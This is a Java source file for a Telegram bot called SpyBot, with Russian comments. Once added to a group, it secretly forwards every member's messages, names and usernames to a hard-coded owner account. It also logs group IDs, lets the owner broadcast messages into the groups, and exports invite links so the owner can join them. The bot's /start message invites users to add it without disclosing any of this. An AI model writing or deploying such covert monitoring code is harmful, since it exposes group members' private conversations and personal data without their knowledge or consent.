package org.example;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.groupadministration.ExportChatInviteLink;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Chat;
import org.telegram.telegrambots.meta.api.objects.Message;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.api.objects.User;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;

import java.io.*;
import java.util.*;

public class SpyBot extends TelegramLongPollingBot {

    private final long ownerId = 1032570871L; // Замени на свой Telegram user ID
    private final File groupsFile = new File("groups.txt");

    // Где-нибудь в классе бота (глобально)
    private final Set<Long> invitedUsers = new HashSet<>();

    @Override
    public String getBotUsername() {
        return "@SpyMyMessageBot"; // Заменить на имя бота
    }

    @Override
    public String getBotToken() {
        try {
            Properties props = new Properties();
            props.load(new FileInputStream("config.properties"));
            return props.getProperty("bot.token");
        } catch (IOException e) {
            e.printStackTrace();
            return null; // или кидай ошибку, если хочешь
        }
    }


    @Override
    public void onUpdateReceived(Update update) {
        if (update.hasMessage()) {
            Message msg = update.getMessage();
            Chat chat = msg.getChat();
            long userId = msg.getFrom().getId();

            if (chat.isGroupChat() || chat.isSuperGroupChat()) {
                saveGroupId(chat.getId());

                User sender = msg.getFrom();

                String senderName = sender.getFirstName();
                if (sender.getLastName() != null) {
                    senderName += " " + sender.getLastName();
                }

                String username = sender.getUserName() != null ? "@" + sender.getUserName() : "[нет username]";

                String messageText;
                if (msg.hasText()) {
                    messageText = msg.getText();
                } else if (msg.hasSticker()) {
                    messageText = "[Стикер: " + msg.getSticker().getEmoji() + "]";
                } else if (msg.hasPhoto()) {
                    messageText = "[Фото]";
                } else if (msg.hasDocument()) {
                    messageText = "[Документ: " + msg.getDocument().getFileName() + "]";
                } else if (msg.hasVideo()) {
                    messageText = "[Видео]";
                } else {
                    messageText = "[Неизвестный тип сообщения]";
                }

                String text = "📥 Новое сообщение из группы:\n" +
                        "👥 Название: " + chat.getTitle() + "\n" +
                        "🆔 Group ID: " + chat.getId() + "\n" +
                        "🙎‍♂️ Отправитель: " + senderName + "\n" +
                        "🔗 Username: " + username + "\n" +
                        "💬 Сообщение: " + messageText;

                sendMessage(ownerId, text);
            }


            // Команда от владельца в ЛС: /alert сообщение
            if (chat.isUserChat() && msg.getFrom().getId() == ownerId) {
                String text = msg.getText();

                if (text.startsWith("/alert ")) {
                    String args = text.substring(7).trim();

                    // Если начинается с "-", возможно это groupId
                    if (args.startsWith("-") || args.matches("-?\\d+ .*")) {
                        // Пытаемся выделить ID и сообщение
                        int firstSpaceIndex = args.indexOf(' ');
                        if (firstSpaceIndex > 0) {
                            try {
                                String groupIdStr = args.substring(0, firstSpaceIndex);
                                long groupId = Long.parseLong(groupIdStr);
                                String messageToGroup = args.substring(firstSpaceIndex + 1);
                                sendMessage(groupId, messageToGroup);
                                sendMessage(ownerId, "✅ Сообщение отправлено в группу " + groupId);
                            } catch (NumberFormatException e) {
                                sendMessage(ownerId, "❌ Неверный формат Group ID.");
                            }
                        } else {
                            sendMessage(ownerId, "❌ Укажи сообщение после Group ID.");
                        }
                    } else {
                        // Старый способ — всем группам
                        sendToAllGroups(args);
                        sendMessage(ownerId, "📨 Сообщение разослано по группам!");
                    }
                }













                if (text.startsWith("/forcejoin") && userId == ownerId) { // Только для тебя
                    String[] parts = text.split(" ");
                    if (parts.length < 2) {
                        sendMessage(userId, "❌ Укажи Group ID: /forcejoin <groupID>");
                        return;
                    }

                    try {
                        long groupId = Long.parseLong(parts[1]);

                        try {
                            // 1. Пробуем получить ссылку-приглашение (если бот админ)
                            ExportChatInviteLink request = new ExportChatInviteLink();
                            request.setChatId(String.valueOf(groupId));
                            String inviteLink = execute(request);

                            sendMessage(userId, "🔗 Нажми, чтобы присоединиться:\n" + inviteLink);

                        } catch (TelegramApiRequestException e) {
                            // Если ошибка Telegram API (например, бот не админ)
                            sendMessage(userId, "❌ error with joining group");
                        } catch (TelegramApiException e) {
                            // Если системная ошибка Java/Telegram API
                            sendMessage(userId, "❌ error with joining group (system error)");
                            e.printStackTrace();
                        }

                    } catch (NumberFormatException e) {
                        sendMessage(userId, "❌ Неверный формат Group ID.");
                    }
                }





















                if (text.equals("/start")) {
                    if (!invitedUsers.contains(userId)) {
                        invitedUsers.add(userId); // Запоминаем, что уже отправляли

                        String botUsername = "SpyMyMessageBot"; // без @

                        SendMessage msgFromBot = new SendMessage();
                        msgFromBot.setChatId(String.valueOf(userId));
                        msgFromBot.setText("➕ Нажми кнопку ниже, чтобы добавить меня в свою группу:");

                        InlineKeyboardButton addButton = new InlineKeyboardButton();
                        addButton.setText("➕ Добавить в группу");
                        addButton.setUrl("https://t.me/" + botUsername + "?startgroup=true");

                        List<List<InlineKeyboardButton>> keyboard = new ArrayList<>();
                        keyboard.add(Collections.singletonList(addButton));

                        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
                        markup.setKeyboard(keyboard);
                        msgFromBot.setReplyMarkup(markup);

                        try {
                            execute(msgFromBot);
                        } catch (TelegramApiException e) {
                            e.printStackTrace();
                        }
                    } else {
                        // Если уже отправляли — можно ничего не делать или написать: "Вы уже получили ссылку"
                        SendMessage alreadySent = new SendMessage();
                        alreadySent.setChatId(String.valueOf(userId));
                        alreadySent.setText("✅ Вы уже получили кнопку для добавления бота в группу.");
                        try {
                            execute(alreadySent);
                        } catch (TelegramApiException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }


        }
    }

    private void saveGroupId(Long groupId) {
        try {
            Set<String> existingIds = new HashSet<>();
            if (groupsFile.exists()) {
                BufferedReader reader = new BufferedReader(new FileReader(groupsFile));
                String line;
                while ((line = reader.readLine()) != null) {
                    existingIds.add(line.trim());
                }
                reader.close();
            }

            if (!existingIds.contains(groupId.toString())) {
                FileWriter writer = new FileWriter(groupsFile, true);
                writer.write(groupId + "\n");
                writer.close();
                System.out.println("💾 Группа добавлена: " + groupId);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendToAllGroups(String message) {
        try {
            if (!groupsFile.exists()) return;

            BufferedReader reader = new BufferedReader(new FileReader(groupsFile));
            String line;
            while ((line = reader.readLine()) != null) {
                try {
                    long chatId = Long.parseLong(line.trim());
                    sendMessage(chatId, message);
                } catch (NumberFormatException e) {
                    System.out.println("❌ Невалидный ID: " + line);
                }
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendMessage(long chatId, String text) {
        SendMessage msg = new SendMessage();
        msg.setChatId(chatId);
        msg.setText(text);
        try {
            execute(msg);
        } catch (TelegramApiException e) {
            System.out.println("❌ Ошибка отправки в " + chatId + ": " + e.getMessage());
        }
    }
}
